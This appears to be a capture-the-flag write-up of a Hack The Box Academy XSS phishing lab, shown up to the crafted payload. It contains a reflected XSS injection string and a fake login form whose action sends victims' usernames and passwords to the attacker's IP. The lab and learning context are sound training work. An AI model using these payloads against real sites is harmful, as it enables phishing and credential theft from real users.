# HTB Academy XSS Phishing Task Solution

This repository documents my solution to the Hack The Box (HTB) Academy Cross-Site Scripting (XSS) phishing task. The goal was to exploit an XSS vulnerability in an "Image URL" input field, inject a fake login form, capture victim credentials, and use them to obtain a flag.

- **Attacker IP (My Machine):** `10.10.14.179` (where credentials are sent)
- **Target IP (HTB Server):** `10.129.9.211` (hosts the vulnerable app)
- **Date Solved:** April 10, 2025

---

## Objective
Exploit the XSS vulnerability at `http://10.129.9.211/phishing/index.php?url=` to:
1. Inject a malicious login form.
2. Send the victim's credentials to my IP (`10.10.14.179`).
3. Use the captured credentials to log in at `http://10.129.9.211/phishing/login.php` and retrieve the flag.

---

## Step-by-Step Solution

### Step 1: Confirm XSS Vulnerability
1. **Access the Target Page:**
   - URL: `http://10.129.9.211/phishing/index.php`
   - Locate the "Image URL" input field.

2. **Test Input Reflection:**
   - Input: `test`
   - Submit and view source: `<img src='test'>`
   - Result: Input is reflected unsanitized into an `<img>` tag.

3. **Test XSS:**
   - Input: `'><script>alert(1);</script>`
   - URL: `http://10.129.9.211/phishing/index.php?url='><script>alert(1);</script>`
   - Result: Alert pops up with "1", confirming XSS vulnerability.

---

### Step 2: Craft the Malicious Payload
Inject a fake login form that submits credentials to `10.10.14.179`.

1. **Fake Login Form HTML:**
   ```html
   <h3>Please login to continue</h3><form action=http://10.10.14.179><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
